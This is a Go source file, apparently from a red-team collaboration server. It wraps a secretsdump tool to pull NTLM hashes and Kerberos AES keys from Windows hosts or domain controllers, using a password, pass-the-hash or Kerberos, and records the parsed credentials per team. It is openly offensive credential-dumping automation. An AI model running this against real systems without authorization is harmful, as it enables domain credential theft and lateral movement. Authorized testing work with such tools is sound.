package main

import (
	"context"
	"errors"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"strings"
	"time"
)

var (
	ntlmDumpPattern = regexp.MustCompile(`^([^:\[\]\s][^:]*):([0-9]+):([0-9A-Fa-f]{32}):([0-9A-Fa-f]{32}):.*$`)
	aesDumpPattern  = regexp.MustCompile(`^([^:\[\]\s][^:]*):(aes(?:128|256)-cts-hmac-sha1-96):([0-9A-Fa-f]+)$`)
)

func RunSecretsdump(teamName string, req RunSecretsdumpRequest) (*RunSecretsdumpResponse, error) {
	if _, err := GetTeamByName(teamName); err != nil {
		return nil, err
	}

	commandParts := splitToolCommand(req.ToolCommand)
	if len(commandParts) == 0 {
		return nil, errors.New("tool command is required")
	}

	args, env, err := secretsdumpCommandArgs(req)
	if err != nil {
		return nil, err
	}

	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Minute)
	defer cancel()

	cmd := exec.CommandContext(ctx, commandParts[0], append(commandParts[1:], args...)...)
	cmd.Dir = serverWorkingDir()
	cmd.Env = append(os.Environ(), env...)

	outputBytes, runErr := cmd.CombinedOutput()
	output := string(outputBytes)
	if ctx.Err() == context.DeadlineExceeded {
		return nil, fmt.Errorf("secretsdump timed out: %s", output)
	}
	if runErr != nil {
		return nil, fmt.Errorf("secretsdump failed: %w\n%s", runErr, output)
	}

	parsed := parseSecretsdumpCredentials(output, req.Domain, req.Target)
	created := make([]Credential, 0, len(parsed))
	for _, credentialReq := range parsed {
		credential, err := CreateCredentialIfMissing(teamName, credentialReq)
		if err != nil {
			return nil, err
		}
		created = append(created, *credential)
	}

	return &RunSecretsdumpResponse{
		Command:     append(commandParts, args...),
		Output:      output,
		Credentials: created,
	}, nil
}

func secretsdumpCommandArgs(req RunSecretsdumpRequest) ([]string, []string, error) {
	userPrefix := req.Username
	if req.Domain != "" {
		userPrefix = req.Domain + "/" + req.Username
	}

	args := []string{}
	if req.JustDC {
		args = append(args, "-just-dc")
	}
	if req.UseVSS {
		args = append(args, "-use-vss")
	}
	if req.KDCHost != "" {
		args = append(args, "-dc-ip", req.KDCHost)
	}

	env := []string{}
	switch req.AuthMode {
	case "password":
		if req.Password == "" {
			return nil, nil, errors.New("password is required")
		}
		args = append(args, userPrefix+":"+req.Password+"@"+req.Target)
	case "hash":
		if req.NTHash == "" {
			return nil, nil, errors.New("NT hash is required")
		}
		args = append(args, "-hashes", req.LMHash+":"+req.NTHash, userPrefix+"@"+req.Target)
	case "kerberos":
		args = append(args, "-k")
		if req.UseKerberosCache || req.AESKey == "" {
			args = append(args, "-no-pass")
		}
		if req.AESKey != "" {
			args = append(args, "-aesKey", req.AESKey)
		}
		if req.UseKerberosCache && req.CachePath != "" {
			env = append(env, "KRB5CCNAME="+resolveLocalPath(req.CachePath))
		}
		args = append(args, userPrefix+"@"+req.Target)
	default:
		return nil, nil, errors.New("auth mode must be password, hash, or kerberos")
	}

	return args, env, nil
}

func parseSecretsdumpCredentials(output string, fallbackDomain string, target string) []CreateCredentialRequest {
	seen := map[string]bool{}
	var credentials []CreateCredentialRequest

	for _, rawLine := range strings.Split(output, "\n") {
		line := strings.TrimSpace(rawLine)
		if line == "" || strings.HasPrefix(line, "[") || strings.HasPrefix(line, "*") {
			continue
		}

		if matches := ntlmDumpPattern.FindStringSubmatch(line); matches != nil {
			accountDomain, username := splitDumpAccount(matches[1], fallbackDomain)
			rid := matches[2]
			lmHash := strings.ToLower(matches[3])
			ntHash := strings.ToLower(matches[4])
			host := ""
			if strings.HasSuffix(username, "$") {
				host = strings.TrimSuffix(username, "$")
			}

			req := CreateCredentialRequest{
				OS:         "windows",
				Username:   username,
				SecretType: "ntlm",
				Secret:     lmHash + ":" + ntHash,
				RID:        rid,
				Domain:     accountDomain,
				Host:       host,
				IP:         target,
			}
			if addCredentialOnce(seen, req) {
				credentials = append(credentials, req)
			}
			continue
		}

		if matches := aesDumpPattern.FindStringSubmatch(line); matches != nil {
			accountDomain, username := splitDumpAccount(matches[1], fallbackDomain)
			algorithm := matches[2]
			key := strings.ToLower(matches[3])
			host := ""
			if strings.HasSuffix(username, "$") {
				host = strings.TrimSuffix(username, "$")
			}

			req := CreateCredentialRequest{
				OS:         "windows",
				Username:   username,
				SecretType: aesSecretType(algorithm),
				Secret:     key,
				Domain:     accountDomain,
				Host:       host,
				IP:         target,
			}
			if addCredentialOnce(seen, req) {
				credentials = append(credentials, req)
			}
		}
	}

	return credentials
}

func splitDumpAccount(account string, fallbackDomain string) (string, string) {
	account = strings.TrimSpace(account)
	for _, separator := range []string{"\\", "/"} {
		if parts := strings.SplitN(account, separator, 2); len(parts) == 2 {
			return parts[0], parts[1]
		}
	}
	return fallbackDomain, account
}

func aesSecretType(algorithm string) string {
	if strings.HasPrefix(algorithm, "aes256") {
		return "kerberos-aes256"
	}
	if strings.HasPrefix(algorithm, "aes128") {
		return "kerberos-aes128"
	}
	return "kerberos-aes"
}

func addCredentialOnce(seen map[string]bool, req CreateCredentialRequest) bool {
	key := strings.Join([]string{req.Username, req.SecretType, req.Secret, req.RID, req.Domain, req.Host, req.IP}, "\x00")
	if seen[key] {
		return false
	}
	seen[key] = true
	return true
}

func serverWorkingDir() string {
	cwd, err := os.Getwd()
	if err != nil {
		return "."
	}
	if filepath.Base(cwd) == "server" {
		return cwd
	}
	return filepath.Join(cwd, "server")
}

func resolveLocalPath(path string) string {
	if filepath.IsAbs(path) {
		return path
	}
	cwd, err := os.Getwd()
	if err != nil {
		return path
	}
	if filepath.Base(cwd) == "server" {
		return filepath.Join(cwd, "..", path)
	}
	return filepath.Join(cwd, path)
}
